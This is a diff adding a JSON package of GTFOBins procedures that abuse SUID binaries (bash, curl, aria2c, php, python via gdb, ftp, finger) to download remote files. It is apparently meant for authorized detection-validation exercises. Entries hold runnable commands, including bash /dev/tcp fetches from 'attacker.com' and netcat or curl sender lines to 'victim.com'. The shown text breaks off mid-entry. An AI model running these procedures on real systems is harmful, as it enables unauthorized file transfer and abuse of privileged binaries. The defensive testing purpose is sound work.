@@ -1,0 +1,3413 @@
+{
+  "package_id": "gtfobins-download-suid-v1",
+  "package_name": "GTFOBins - Download / Suid",
+  "version": "1.0.0",
+  "summary": "37 source-derived GTFOBins Living-Off-The-Land procedures for download / Suid.",
+  "description": "Faithful, deterministic conversion of explicit GTFOBins procedures. Commands retain upstream behavior while environment values use Morgana Tags.",
+  "purpose": "Run authorized Living-Off-The-Land detection validation using legitimate native or commonly available utilities in adversary-like ways.",
+  "capabilities": [
+    "Provides 37 distinct source procedures grouped by download / Suid.",
+    "Preserves source identity, ATT&CK mappings, execution context, prerequisites, and provider metadata.",
+    "Supports deterministic content-only updates from pinned upstream commits."
+  ],
+  "use_cases": [
+    "Validate endpoint and network detections for authorized Living-Off-The-Land behavior.",
+    "Search and import only the utility, function, context, platform, or ATT&CK coverage needed for an exercise."
+  ],
+  "safety_notes": [
+    "Review every command, Tag, privilege requirement, and readiness classification before execution.",
+    "Interactive, elevated, SUID, capability, and counterpart-dependent procedures require an explicitly prepared lab.",
+    "No upstream command is executed during conversion or import."
+  ],
+  "prerequisites": [
+    "The referenced Linux/Unix binary must exist on the target.",
+    "Operator-supplied Tags and any declared privilege or network counterpart must be configured.",
+    "Explicit authorization for the target and procedure behavior."
+  ],
+  "author": "GTFOBins / X3M.AI conversion",
+  "created": "2026-08-28",
+  "script_prefix": "GTFOBINS - ",
+  "provider": "gtfobins",
+  "source": "gtfobins",
+  "source_repository": "https://github.com/GTFOBins/GTFOBins.github.io",
+  "source_commit": "acd524623f9c406acedd2754ebd9c2431f3675ad",
+  "source_license": "GPL-3.0",
+  "documentation_url": "https://github.com/GTFOBins/GTFOBins.github.io",
+  "mitre_domain": "enterprise-attack",
+  "mitre_tactic": "Download",
+  "mitre_tcodes": [
+    "T1105"
+  ],
+  "platform": [
+    "linux"
+  ],
+  "risk_badges": [
+    "modify"
+  ],
+  "readiness_counts": {
+    "environment_prerequisite": 1,
+    "manual_counterpart_required": 36
+  },
+  "category": "lotl/gtfobins",
+  "tag_categories": [
+    {
+      "category_id": "lotl_gtfobins_parameters",
+      "label": "GTFOBins Runtime Parameters",
+      "description": "Operator-supplied values shared by Living-Off-The-Land procedures.",
+      "scope": "local",
+      "tags": [
+        {
+          "key": "lotl_gtfobins_input_file",
+          "label": "Input File",
+          "description": "Operator-supplied input file for this authorized LOTL procedure. Source token: /path/to/input-file.",
+          "sensitive": false,
+          "required": true,
+          "default": "",
+          "example": "",
+          "parameter_class": "input_file"
+        },
+        {
+          "key": "lotl_gtfobins_local_path",
+          "label": "Local Path",
+          "description": "Operator-supplied local path for this authorized LOTL procedure. Source token: /path/to/temp-file.",
+          "sensitive": false,
+          "required": true,
+          "default": "",
+          "example": "",
+          "parameter_class": "local_path"
+        },
+        {
+          "key": "lotl_gtfobins_output_file",
+          "label": "Output File",
+          "description": "Operator-supplied output file for this authorized LOTL procedure. Source token: /path/to/output-file.",
+          "sensitive": false,
+          "required": true,
+          "default": "",
+          "example": "",
+          "parameter_class": "output_file"
+        },
+        {
+          "key": "lotl_gtfobins_remote_host",
+          "label": "Remote Host",
+          "description": "Operator-supplied remote host for this authorized LOTL procedure. Source token: \\b(?:attacker|victim)\\.com\\b.",
+          "sensitive": false,
+          "required": true,
+          "default": "",
+          "example": "",
+          "parameter_class": "connection"
+        },
+        {
+          "key": "lotl_gtfobins_remote_port",
+          "label": "Remote Port",
+          "description": "Operator-supplied remote port for this authorized LOTL procedure. Source token: \\b12345\\b.",
+          "sensitive": false,
+          "required": true,
+          "default": "",
+          "example": "",
+          "parameter_class": "connection"
+        }
+      ]
+    }
+  ],
+  "assets": [],
+  "scripts": [
+    {
+      "id": "gtfobins:ab:download:0:suid::",
+      "name": "GTFOBINS - T1105 - ab - Download - Suid [77f47ec]",
+      "description": "This executable can download remote data. Binary: ab. Context: SUID.",
+      "tactic": "Command and Control",
+      "tcode": "T1105",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "ab -v2 http://#{lotl_gtfobins_remote_host}#{lotl_gtfobins_input_file}",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_input_file",
+        "lotl_gtfobins_remote_host"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/ab",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/ab",
+        "source_bin": "ab",
+        "function": "download",
+        "function_label": "Download",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": true,
+        "function_metadata": {
+          "binary": {
+            "false": "The content is corrupted or otherwise altered by the process, thus it might not be suitable for handling arbitrary binary data."
+          },
+          "sender": {
+            "tcp-client": {
+              "comment": "A TCP client can be used on the attacker box to send the data.",
+              "code": "nc victim.com 12345 </path/to/input-file"
+            },
+            "tcp-server": {
+              "comment": "A TCP server can be used on the attacker box to send the data.",
+              "code": "nc -l -p 12345 </path/to/input-file"
+            },
+            "http-client": {
+              "comment": "An HTTP client can be used on the attacker box to send the data.",
+              "code": "curl victim.com --data-binary @/path/to/input-file"
+            },
+            "http-server": {
+              "comment": "An HTTP server can be used on the attacker box to send the data.",
+              "code": "python -m http.server 80"
+            },
+            "ftp-server": {
+              "comment": "An FTP server can be used on the attacker box to send the data.",
+              "code": "python -m pyftpdlib -w -p 21"
+            },
+            "ssh-server": {
+              "comment": "An SSH server can be used on the attacker box to send the data."
+            },
+            "tls-server": {
+              "comment": "A TLS server can be used on the attacker box to send the data.",
+              "code": "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345 </path/to/input-file"
+            }
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "sender": "http-server"
+        },
+        "operator_notes": {
+          "sender": "http-server"
+        },
+        "provider": "gtfobins",
+        "source_id": "gtfobins:ab:download:0:suid::",
+        "source_name": "ab",
+        "source_tcodes": [
+          "T1105"
+        ],
+        "category": "download",
+        "readiness": "manual_counterpart_required",
+        "prerequisites": [
+          "The `ab` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits.",
+          "The operator must start and control the documented counterpart infrastructure separately."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:aria2c:download:0:suid::",
+      "name": "GTFOBINS - T1105 - aria2c - Download - Suid [b5fefb3]",
+      "description": "This executable can download remote data. Binary: aria2c. Context: SUID. Use `--allow-overwrite` if needed. Similarly `-o /path/to/ouput-file` can be omitted, in that case the file is saved to `input-file` in the current working directory.",
+      "tactic": "Command and Control",
+      "tcode": "T1105",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "aria2c -o /path/to/ouput-file http://#{lotl_gtfobins_remote_host}#{lotl_gtfobins_input_file}",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_input_file",
+        "lotl_gtfobins_remote_host"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/aria2c",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/aria2c",
+        "source_bin": "aria2c",
+        "function": "download",
+        "function_label": "Download",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "binary": {
+            "false": "The content is corrupted or otherwise altered by the process, thus it might not be suitable for handling arbitrary binary data."
+          },
+          "sender": {
+            "tcp-client": {
+              "comment": "A TCP client can be used on the attacker box to send the data.",
+              "code": "nc victim.com 12345 </path/to/input-file"
+            },
+            "tcp-server": {
+              "comment": "A TCP server can be used on the attacker box to send the data.",
+              "code": "nc -l -p 12345 </path/to/input-file"
+            },
+            "http-client": {
+              "comment": "An HTTP client can be used on the attacker box to send the data.",
+              "code": "curl victim.com --data-binary @/path/to/input-file"
+            },
+            "http-server": {
+              "comment": "An HTTP server can be used on the attacker box to send the data.",
+              "code": "python -m http.server 80"
+            },
+            "ftp-server": {
+              "comment": "An FTP server can be used on the attacker box to send the data.",
+              "code": "python -m pyftpdlib -w -p 21"
+            },
+            "ssh-server": {
+              "comment": "An SSH server can be used on the attacker box to send the data."
+            },
+            "tls-server": {
+              "comment": "A TLS server can be used on the attacker box to send the data.",
+              "code": "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345 </path/to/input-file"
+            }
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {},
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:aria2c:download:0:suid::",
+        "source_name": "aria2c",
+        "source_tcodes": [
+          "T1105"
+        ],
+        "category": "download",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `aria2c` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:bash:download:1:suid::",
+      "name": "GTFOBINS - T1105 - bash - Download - Suid [1bebbe3]",
+      "description": "This executable can download remote data. Binary: bash. Context: SUID.",
+      "tactic": "Command and Control",
+      "tcode": "T1105",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "bash -p -c 'echo \"$(</dev/tcp/#{lotl_gtfobins_remote_host}/#{lotl_gtfobins_remote_port}) >#{lotl_gtfobins_output_file}'",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_output_file",
+        "lotl_gtfobins_remote_host",
+        "lotl_gtfobins_remote_port"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/bash",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/bash",
+        "source_bin": "bash",
+        "function": "download",
+        "function_label": "Download",
+        "snippet_index": 1,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": true,
+        "function_metadata": {
+          "binary": {
+            "false": "The content is corrupted or otherwise altered by the process, thus it might not be suitable for handling arbitrary binary data."
+          },
+          "sender": {
+            "tcp-client": {
+              "comment": "A TCP client can be used on the attacker box to send the data.",
+              "code": "nc victim.com 12345 </path/to/input-file"
+            },
+            "tcp-server": {
+              "comment": "A TCP server can be used on the attacker box to send the data.",
+              "code": "nc -l -p 12345 </path/to/input-file"
+            },
+            "http-client": {
+              "comment": "An HTTP client can be used on the attacker box to send the data.",
+              "code": "curl victim.com --data-binary @/path/to/input-file"
+            },
+            "http-server": {
+              "comment": "An HTTP server can be used on the attacker box to send the data.",
+              "code": "python -m http.server 80"
+            },
+            "ftp-server": {
+              "comment": "An FTP server can be used on the attacker box to send the data.",
+              "code": "python -m pyftpdlib -w -p 21"
+            },
+            "ssh-server": {
+              "comment": "An SSH server can be used on the attacker box to send the data."
+            },
+            "tls-server": {
+              "comment": "A TLS server can be used on the attacker box to send the data.",
+              "code": "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345 </path/to/input-file"
+            }
+          }
+        },
+        "context_metadata": {
+          "code": "bash -p -c 'echo \"$(</dev/tcp/attacker.com/12345) >/path/to/output-file'"
+        },
+        "procedure_metadata": {
+          "binary": false,
+          "sender": "tcp-server"
+        },
+        "operator_notes": {
+          "sender": "tcp-server"
+        },
+        "provider": "gtfobins",
+        "source_id": "gtfobins:bash:download:1:suid::",
+        "source_name": "bash",
+        "source_tcodes": [
+          "T1105"
+        ],
+        "category": "download",
+        "readiness": "manual_counterpart_required",
+        "prerequisites": [
+          "The `bash` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits.",
+          "The operator must start and control the documented counterpart infrastructure separately."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:bash:download:0:suid::",
+      "name": "GTFOBINS - T1105 - bash - Download - Suid [e402d42]",
+      "description": "This executable can download remote data. Binary: bash. Context: SUID.",
+      "tactic": "Command and Control",
+      "tcode": "T1105",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "bash -p -c '{ echo -ne \"GET #{lotl_gtfobins_input_file} HTTP/1.0\\r\\nhost: #{lotl_gtfobins_remote_host}\\r\\n\\r\\n\" 1>&3; cat 0<&3; } \\\n    3<>/dev/tcp/#{lotl_gtfobins_remote_host}/#{lotl_gtfobins_remote_port} \\\n    | { while read -r; do [ \"$REPLY\" = \"$(echo -ne \"\\r\")\" ] && break; done; cat; } >#{lotl_gtfobins_output_file}'",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_input_file",
+        "lotl_gtfobins_output_file",
+        "lotl_gtfobins_remote_host",
+        "lotl_gtfobins_remote_port"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/bash",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/bash",
+        "source_bin": "bash",
+        "function": "download",
+        "function_label": "Download",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": true,
+        "function_metadata": {
+          "binary": {
+            "false": "The content is corrupted or otherwise altered by the process, thus it might not be suitable for handling arbitrary binary data."
+          },
+          "sender": {
+            "tcp-client": {
+              "comment": "A TCP client can be used on the attacker box to send the data.",
+              "code": "nc victim.com 12345 </path/to/input-file"
+            },
+            "tcp-server": {
+              "comment": "A TCP server can be used on the attacker box to send the data.",
+              "code": "nc -l -p 12345 </path/to/input-file"
+            },
+            "http-client": {
+              "comment": "An HTTP client can be used on the attacker box to send the data.",
+              "code": "curl victim.com --data-binary @/path/to/input-file"
+            },
+            "http-server": {
+              "comment": "An HTTP server can be used on the attacker box to send the data.",
+              "code": "python -m http.server 80"
+            },
+            "ftp-server": {
+              "comment": "An FTP server can be used on the attacker box to send the data.",
+              "code": "python -m pyftpdlib -w -p 21"
+            },
+            "ssh-server": {
+              "comment": "An SSH server can be used on the attacker box to send the data."
+            },
+            "tls-server": {
+              "comment": "A TLS server can be used on the attacker box to send the data.",
+              "code": "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345 </path/to/input-file"
+            }
+          }
+        },
+        "context_metadata": {
+          "code": "bash -p -c '{ echo -ne \"GET /path/to/input-file HTTP/1.0\\r\\nhost: attacker.com\\r\\n\\r\\n\" 1>&3; cat 0<&3; } \\\n    3<>/dev/tcp/attacker.com/12345 \\\n    | { while read -r; do [ \"$REPLY\" = \"$(echo -ne \"\\r\")\" ] && break; done; cat; } >/path/to/output-file'"
+        },
+        "procedure_metadata": {
+          "binary": false,
+          "sender": "http-server"
+        },
+        "operator_notes": {
+          "sender": "http-server"
+        },
+        "provider": "gtfobins",
+        "source_id": "gtfobins:bash:download:0:suid::",
+        "source_name": "bash",
+        "source_tcodes": [
+          "T1105"
+        ],
+        "category": "download",
+        "readiness": "manual_counterpart_required",
+        "prerequisites": [
+          "The `bash` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits.",
+          "The operator must start and control the documented counterpart infrastructure separately."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:bee:download:0:suid:0:bee>php",
+      "name": "GTFOBINS - T1105 - bee - Download - Suid [2f9c569]",
+      "description": "This executable can download remote data. Binary: bee. Context: SUID. This allows to run PHP code (`...`). This must be excuted from the Backdrop CMS root directory (e.g. `/var/www/html`), alternatively use the `--root` option. Inherits download behavior from php.",
+      "tactic": "Command and Control",
+      "tcode": "T1105",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "bee eval '...'\nphp -r '$c=file_get_contents(\"http://#{lotl_gtfobins_remote_host}#{lotl_gtfobins_input_file}\"); file_put_contents(\"#{lotl_gtfobins_output_file}\", $c);'",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_input_file",
+        "lotl_gtfobins_output_file",
+        "lotl_gtfobins_remote_host"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/bee",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/bee",
+        "source_bin": "bee",
+        "function": "download",
+        "function_label": "Download",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": "php",
+        "inheritance_path": [
+          "bee",
+          "php"
+        ],
+        "interactive": false,
+        "manual_prerequisite": true,
+        "function_metadata": {
+          "binary": {
+            "false": "The content is corrupted or otherwise altered by the process, thus it might not be suitable for handling arbitrary binary data."
+          },
+          "sender": {
+            "tcp-client": {
+              "comment": "A TCP client can be used on the attacker box to send the data.",
+              "code": "nc victim.com 12345 </path/to/input-file"
+            },
+            "tcp-server": {
+              "comment": "A TCP server can be used on the attacker box to send the data.",
+              "code": "nc -l -p 12345 </path/to/input-file"
+            },
+            "http-client": {
+              "comment": "An HTTP client can be used on the attacker box to send the data.",
+              "code": "curl victim.com --data-binary @/path/to/input-file"
+            },
+            "http-server": {
+              "comment": "An HTTP server can be used on the attacker box to send the data.",
+              "code": "python -m http.server 80"
+            },
+            "ftp-server": {
+              "comment": "An FTP server can be used on the attacker box to send the data.",
+              "code": "python -m pyftpdlib -w -p 21"
+            },
+            "ssh-server": {
+              "comment": "An SSH server can be used on the attacker box to send the data."
+            },
+            "tls-server": {
+              "comment": "A TLS server can be used on the attacker box to send the data.",
+              "code": "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345 </path/to/input-file"
+            }
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "sender": "http-server",
+          "inherited_from": "php",
+          "inheritance_path": [
+            "bee",
+            "php"
+          ],
+          "inherit_index": 0
+        },
+        "operator_notes": {
+          "sender": "http-server"
+        },
+        "provider": "gtfobins",
+        "source_id": "gtfobins:bee:download:0:suid:0:bee>php",
+        "source_name": "bee",
+        "source_tcodes": [
+          "T1105"
+        ],
+        "category": "download",
+        "readiness": "manual_counterpart_required",
+        "prerequisites": [
+          "The `bee` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits.",
+          "The operator must start and control the documented counterpart infrastructure separately."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:curl:download:0:suid::",
+      "name": "GTFOBINS - T1105 - curl - Download - Suid [5dfd44f]",
+      "description": "This executable can download remote data. Binary: curl. Context: SUID.",
+      "tactic": "Command and Control",
+      "tcode": "T1105",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "curl http://#{lotl_gtfobins_remote_host}#{lotl_gtfobins_input_file} -o #{lotl_gtfobins_output_file}",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_input_file",
+        "lotl_gtfobins_output_file",
+        "lotl_gtfobins_remote_host"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/curl",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/curl",
+        "source_bin": "curl",
+        "function": "download",
+        "function_label": "Download",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": true,
+        "function_metadata": {
+          "binary": {
+            "false": "The content is corrupted or otherwise altered by the process, thus it might not be suitable for handling arbitrary binary data."
+          },
+          "sender": {
+            "tcp-client": {
+              "comment": "A TCP client can be used on the attacker box to send the data.",
+              "code": "nc victim.com 12345 </path/to/input-file"
+            },
+            "tcp-server": {
+              "comment": "A TCP server can be used on the attacker box to send the data.",
+              "code": "nc -l -p 12345 </path/to/input-file"
+            },
+            "http-client": {
+              "comment": "An HTTP client can be used on the attacker box to send the data.",
+              "code": "curl victim.com --data-binary @/path/to/input-file"
+            },
+            "http-server": {
+              "comment": "An HTTP server can be used on the attacker box to send the data.",
+              "code": "python -m http.server 80"
+            },
+            "ftp-server": {
+              "comment": "An FTP server can be used on the attacker box to send the data.",
+              "code": "python -m pyftpdlib -w -p 21"
+            },
+            "ssh-server": {
+              "comment": "An SSH server can be used on the attacker box to send the data."
+            },
+            "tls-server": {
+              "comment": "A TLS server can be used on the attacker box to send the data.",
+              "code": "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345 </path/to/input-file"
+            }
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "sender": "http-server"
+        },
+        "operator_notes": {
+          "sender": "http-server"
+        },
+        "provider": "gtfobins",
+        "source_id": "gtfobins:curl:download:0:suid::",
+        "source_name": "curl",
+        "source_tcodes": [
+          "T1105"
+        ],
+        "category": "download",
+        "readiness": "manual_counterpart_required",
+        "prerequisites": [
+          "The `curl` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits.",
+          "The operator must start and control the documented counterpart infrastructure separately."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:finger:download:0:suid::",
+      "name": "GTFOBINS - T1105 - finger - Download - Suid [6f9387d]",
+      "description": "This executable can download remote data. Binary: finger. Context: SUID. The command hangs waiting for the remote peer to close the socket.",
+      "tactic": "Command and Control",
+      "tcode": "T1105",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "finger x@#{lotl_gtfobins_remote_host}",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_remote_host"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/finger",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/finger",
+        "source_bin": "finger",
+        "function": "download",
+        "function_label": "Download",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": true,
+        "function_metadata": {
+          "binary": {
+            "false": "The content is corrupted or otherwise altered by the process, thus it might not be suitable for handling arbitrary binary data."
+          },
+          "sender": {
+            "tcp-client": {
+              "comment": "A TCP client can be used on the attacker box to send the data.",
+              "code": "nc victim.com 12345 </path/to/input-file"
+            },
+            "tcp-server": {
+              "comment": "A TCP server can be used on the attacker box to send the data.",
+              "code": "nc -l -p 12345 </path/to/input-file"
+            },
+            "http-client": {
+              "comment": "An HTTP client can be used on the attacker box to send the data.",
+              "code": "curl victim.com --data-binary @/path/to/input-file"
+            },
+            "http-server": {
+              "comment": "An HTTP server can be used on the attacker box to send the data.",
+              "code": "python -m http.server 80"
+            },
+            "ftp-server": {
+              "comment": "An FTP server can be used on the attacker box to send the data.",
+              "code": "python -m pyftpdlib -w -p 21"
+            },
+            "ssh-server": {
+              "comment": "An SSH server can be used on the attacker box to send the data."
+            },
+            "tls-server": {
+              "comment": "A TLS server can be used on the attacker box to send the data.",
+              "code": "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345 </path/to/input-file"
+            }
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "sender": {
+            "code": "nc -l -p 79 </path/to/input-file",
+            "comment": "A TCP server can be used on the attacker box to send the data."
+          }
+        },
+        "operator_notes": {
+          "sender": {
+            "code": "nc -l -p 79 </path/to/input-file",
+            "comment": "A TCP server can be used on the attacker box to send the data."
+          }
+        },
+        "provider": "gtfobins",
+        "source_id": "gtfobins:finger:download:0:suid::",
+        "source_name": "finger",
+        "source_tcodes": [
+          "T1105"
+        ],
+        "category": "download",
+        "readiness": "manual_counterpart_required",
+        "prerequisites": [
+          "The `finger` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits.",
+          "The operator must start and control the documented counterpart infrastructure separately."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:ftp:download:0:suid::",
+      "name": "GTFOBINS - T1105 - ftp - Download - Suid [4f0e493]",
+      "description": "This executable can download remote data. Binary: ftp. Context: SUID. Instead of `-a`, credentials can be supplied via the `user:password@host` connection string.",
+      "tactic": "Command and Control",
+      "tcode": "T1105",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "ftp -a #{lotl_gtfobins_remote_host}\nget #{lotl_gtfobins_input_file} output-file",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_input_file",
+        "lotl_gtfobins_remote_host"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/ftp",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/ftp",
+        "source_bin": "ftp",
+        "function": "download",
+        "function_label": "Download",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": true,
+        "function_metadata": {
+          "binary": {
+            "false": "The content is corrupted or otherwise altered by the process, thus it might not be suitable for handling arbitrary binary data."
+          },
+          "sender": {
+            "tcp-client": {
+              "comment": "A TCP client can be used on the attacker box to send the data.",
+              "code": "nc victim.com 12345 </path/to/input-file"
+            },
+            "tcp-server": {
+              "comment": "A TCP server can be used on the attacker box to send the data.",
+              "code": "nc -l -p 12345 </path/to/input-file"
+            },
+            "http-client": {
+              "comment": "An HTTP client can be used on the attacker box to send the data.",
+              "code": "curl victim.com --data-binary @/path/to/input-file"
+            },
+            "http-server": {
+              "comment": "An HTTP server can be used on the attacker box to send the data.",
+              "code": "python -m http.server 80"
+            },
+            "ftp-server": {
+              "comment": "An FTP server can be used on the attacker box to send the data.",
+              "code": "python -m pyftpdlib -w -p 21"
+            },
+            "ssh-server": {
+              "comment": "An SSH server can be used on the attacker box to send the data."
+            },
+            "tls-server": {
+              "comment": "A TLS server can be used on the attacker box to send the data.",
+              "code": "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345 </path/to/input-file"
+            }
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "sender": "ftp-server"
+        },
+        "operator_notes": {
+          "sender": "ftp-server"
+        },
+        "provider": "gtfobins",
+        "source_id": "gtfobins:ftp:download:0:suid::",
+        "source_name": "ftp",
+        "source_tcodes": [
+          "T1105"
+        ],
+        "category": "download",
+        "readiness": "manual_counterpart_required",
+        "prerequisites": [
+          "The `ftp` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits.",
+          "The operator must start and control the documented counterpart infrastructure separately."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:gdb:download:0:suid:0:gdb>python",
+      "name": "GTFOBINS - T1105 - gdb - Download - Suid [ba69b5d]",
+      "description": "This executable can download remote data. Binary: gdb. Context: SUID. This allows to run Python code (`...`). Inherits download behavior from python.",
+      "tactic": "Command and Control",
+      "tcode": "T1105",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "gdb -nx -ex 'python ...' -ex quit\npython -c 'import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve(\"http://#{lotl_gtfobins_remote_host}#{lotl_gtfobins_input_file}\", \"#{lotl_gtfobins_output_file}\")'",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_input_file",
+        "lotl_gtfobins_output_file",
+        "lotl_gtfobins_remote_host"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/gdb",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/gdb",
+        "source_bin": "gdb",
+        "function": "download",
+        "function_label": "Download",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": "python",
+        "inheritance_path": [
+          "gdb",
+          "python"
+        ],
+        "interactive": false,
+        "manual_prerequisite": true,
+        "function_metadata": {
+          "binary": {
+            "false": "The content is corrupted or otherwise altered by the process, thus it might not be suitable for handling arbitrary binary data."
+          },
+          "sender": {
+            "tcp-client": {
+              "comment": "A TCP client can be used on the attacker box to send the data.",
+              "code": "nc victim.com 12345 </path/to/input-file"
+            },
+            "tcp-server": {
+              "comment": "A TCP server can be used on the attacker box to send the data.",
+              "code": "nc -l -p 12345 </path/to/input-file"
+            },
+            "http-client": {
+              "comment": "An HTTP client can be used on the attacker box to send the data.",
